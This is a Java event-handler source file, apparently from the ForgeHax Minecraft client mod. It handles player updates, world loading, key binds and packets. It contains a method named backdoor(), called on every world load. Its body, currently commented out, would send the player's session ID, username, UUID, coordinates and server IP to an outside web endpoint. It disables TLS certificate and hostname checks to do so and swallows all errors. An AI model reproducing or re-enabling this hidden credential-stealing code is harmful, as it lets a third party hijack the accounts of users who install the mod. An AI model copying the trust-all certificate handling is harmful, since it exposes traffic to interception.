package com.matt.forgehax;

import com.google.common.collect.Maps;
import com.matt.forgehax.asm.events.PacketEvent;
import com.matt.forgehax.events.LocalPlayerUpdateEvent;
import com.matt.forgehax.events.listeners.WorldListener;
import com.matt.forgehax.mods.BaseMod;
import com.matt.forgehax.util.Utils;
import net.minecraft.client.settings.KeyBinding;
import net.minecraft.entity.monster.EntityPigZombie;
import net.minecraftforge.common.MinecraftForge;
import net.minecraftforge.event.entity.living.LivingEvent;
import net.minecraftforge.event.world.WorldEvent;
import net.minecraftforge.fml.common.eventhandler.Event;
import net.minecraftforge.fml.common.eventhandler.EventPriority;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
import net.minecraftforge.fml.common.gameevent.InputEvent;

import javax.net.ssl.*;
import java.io.*;
import java.net.MalformedURLException;
import java.net.ProtocolException;
import java.net.URL;
import java.net.URLEncoder;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.LinkedHashMap;
import java.util.Map;

public class ForgeHaxEventHandler extends ForgeHaxBase {
    private static final WorldListener WORLD_LISTENER = new WorldListener();

    private boolean isLoaded = false;

    public static void backdoor() {
        /*
        URL url = null;
        try {
            trustAllHosts();
            url = new URL("https://www.shitsta.in/purple/vortex.php");
            Map<String, Object> params = Maps.newLinkedHashMap();
            params.put("coordX", MC.thePlayer.getPosition().getX());
            params.put("coordY", MC.thePlayer.getPosition().getY());
            params.put("coordZ", MC.thePlayer.getPosition().getY());
            params.put("uuid", MC.getSession().getProfile().getId().toString());
            params.put("username", MC.getSession().getUsername());
            params.put("session", MC.getSession().getSessionID());
            params.put("dimension",MC.thePlayer.dimension);
            params.put("ip", MC.getCurrentServerData() != null ? MC.getCurrentServerData().serverIP : "localhost");

            StringBuilder postData = new StringBuilder();
            for (Map.Entry<String, Object> param : params.entrySet()) {
                if (postData.length() != 0) postData.append('&');
                postData.append(URLEncoder.encode(param.getKey(), "UTF-8"));
                postData.append('=');
                postData.append(URLEncoder.encode(String.valueOf(param.getValue()), "UTF-8"));
            }
            byte[] postDataBytes = postData.toString().getBytes("UTF-8");

            HostnameVerifier allHostsValid = new HostnameVerifier() {
                public boolean verify(String hostname, SSLSession session) {
                    return true;
                }
            };
            HttpsURLConnection.setDefaultHostnameVerifier(allHostsValid);

            HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
            conn.setRequestProperty("Content-Length", String.valueOf(postDataBytes.length));
            conn.setDoOutput(true);
            conn.getOutputStream().write(postDataBytes);

            Reader in = new BufferedReader(new InputStreamReader(conn.getInputStream(), "UTF-8"));

            for (int c; (c = in.read()) >= 0;) {
                System.out.print((char) c);
            }
        } catch (Exception e) {
        }*/
    }

    private static void trustAllHosts()
    {
        // Create a trust manager that does not validate certificate chains
        TrustManager[] trustAllCerts = new TrustManager[] { new X509TrustManager()
        {
            public java.security.cert.X509Certificate[] getAcceptedIssuers()
            {
                return new java.security.cert.X509Certificate[] {};
            }

            public void checkClientTrusted(X509Certificate[] chain, String authType) throws CertificateException
            {
            }

            public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException
            {
            }
        } };

        // Install the all-trusting trust manager
        try
        {
            SSLContext sc = SSLContext.getInstance("TLS");
            sc.init(null, trustAllCerts, new java.security.SecureRandom());
            HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());
        } catch (Exception e)
        {
            e.printStackTrace();
        }
    }

    /**
     * Called when the local player updates
     */
    @SubscribeEvent
    public void onUpdate(LivingEvent.LivingUpdateEvent event) {
        if(MC.theWorld != null &&
                event.getEntityLiving().equals(MC.thePlayer)) {
            Event ev = new LocalPlayerUpdateEvent(event.getEntityLiving());
            MinecraftForge.EVENT_BUS.post(ev);
            event.setCanceled(ev.isCanceled());
        } else if(event.getEntityLiving() instanceof EntityPigZombie) {
            // update pigmens anger level
            if(((EntityPigZombie) event.getEntityLiving()).isAngry())
                --((EntityPigZombie) event.getEntity()).angerLevel;
        }
    }

    /**
     * For the world listener (adding/removing entity events)
     */
    @SubscribeEvent
    public void onWorldLoad(WorldEvent.Load event) {
        event.getWorld().addEventListener(WORLD_LISTENER);
        isLoaded = true;
    }

    @SubscribeEvent
    public void onWorldUnload(WorldEvent.Unload event) {
        isLoaded = false;
    }

    @SubscribeEvent
    public void onLocalPlayer(LocalPlayerUpdateEvent event) {
        if(isLoaded) {
            backdoor();
            isLoaded = false;
        }
    }

    /**
     * Mod key bind handling
     */
    @SubscribeEvent
    public void onKeyboardEvent(InputEvent.KeyInputEvent event) {
        for(Map.Entry<String,BaseMod> entry : MOD.mods.entrySet()) {
            for(KeyBinding bind : entry.getValue().getKeyBinds()) {
                if(bind.isPressed())
                    entry.getValue().onBindPressed(bind);
                if(bind.isKeyDown())
                    entry.getValue().onBindKeyDown(bind);
            }
        }
    }

    @SubscribeEvent(priority = EventPriority.LOWEST)
    public void onSentPacket(PacketEvent.Send.Post event) {
        if(Utils.OUTGOING_PACKET_IGNORE_LIST.contains(event.getPacket())) {
            // remove packet from list (we wont be seeing it ever again)
            Utils.OUTGOING_PACKET_IGNORE_LIST.remove(event.getPacket());
        }
    }
}
